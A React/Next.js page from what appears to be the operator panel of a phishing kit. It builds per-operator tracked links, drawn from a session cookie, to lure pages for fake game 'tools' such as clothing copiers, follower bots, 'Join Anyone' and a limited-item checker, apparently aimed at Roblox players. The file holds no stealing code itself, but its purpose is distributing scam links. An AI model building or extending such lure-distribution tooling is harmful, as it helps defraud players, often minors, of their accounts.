'use client'

import { useState, useEffect } from 'react'
import Link from 'next/link'

const TOOLS = [
  { name: 'Copy Clothes', icon: '👕', path: 'Copy-Clothes', desc: 'Copy any clothing item' },
  { name: 'Copy Games', icon: '🎮', path: 'Copy-Games', desc: 'Download any game' },
  { name: 'Bot Followers', icon: '👤', path: 'Bot-Followers', desc: 'Generate followers' },
  { name: 'Group Botter', icon: '👥', path: 'Group-Botter', desc: 'Bot any group' },
  { name: 'VC Enabler', icon: '🎤', path: 'Vc-Enabler', desc: 'Enable voice chat' },
  { name: 'Join Anyone', icon: '🔓', path: 'Join-Anyone', desc: 'Join any user' },
  { name: 'Enable Shaders', icon: '✨', path: 'Enable-Shaders', desc: 'Advanced graphics' },
  { name: 'Limited Checker', icon: '🔍', path: 'Limited-Checker', desc: 'Check item value' }
]

export default function LinksPage() {
  const [directory, setDirectory] = useState('')
  const [copied, setCopied] = useState(null)

  useEffect(() => {
    const cookies = document.cookie.split(';')
    for (const c of cookies) {
      if (c.trim().startsWith('rc_session=')) {
        try {
          const val = decodeURIComponent(c.trim().split('=')[1])
          const parts = val.split(':')
          const decrypted = atob(parts[1] || '')
          const session = JSON.parse(decrypted)
          setDirectory(session.directory)
        } catch {}
      }
    }
  }, [])

  const copyLink = async (path) => {
    const url = `${window.location.origin}/${path}/${directory}`
    await navigator.clipboard.writeText(url)
    setCopied(path)
    setTimeout(() => setCopied(null), 2000)
  }

  const openLink = (path) => {
    window.open(`/${path}/${directory}`, '_blank')
  }

  if (!directory) {
    return (
      <div className="min-h-screen p-4 flex items-center justify-center">
        <p className="text-gray-400">Loading...</p>
      </div>
    )
  }

  return (
    <div className="min-h-screen p-4 pb-24">
      <div className="max-w-2xl mx-auto">
        <h1 className="text-xl font-bold mb-6">Links</h1>

        <div className="space-y-4">
          {TOOLS.map((tool) => (
            <div key={tool.path} className="bg-card border border-border rounded-xl p-4">
              <div className="flex items-center gap-3 mb-2">
                <span className="text-2xl">{tool.icon}</span>
                <div>
                  <h3 className="font-semibold">{tool.name}</h3>
                  <p className="text-xs text-gray-400">{tool.desc}</p>
                </div>
              </div>

              <p className="text-xs text-gray-500 font-mono mb-3 truncate">
                {window.location.origin}/{tool.path}/{directory}
              </p>

              <div className="flex gap-2">
                <button
                  onClick={() => copyLink(tool.path)}
                  className="flex-1 bg-accent text-white rounded-lg py-2 text-sm font-medium"
                >
                  {copied === tool.path ? 'Copied!' : 'Copy Link'}
                </button>
                <button
                  onClick={() => openLink(tool.path)}
                  className="flex-1 bg-bg border border-border rounded-lg py-2 text-sm font-medium"
                >
                  Open Link
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}
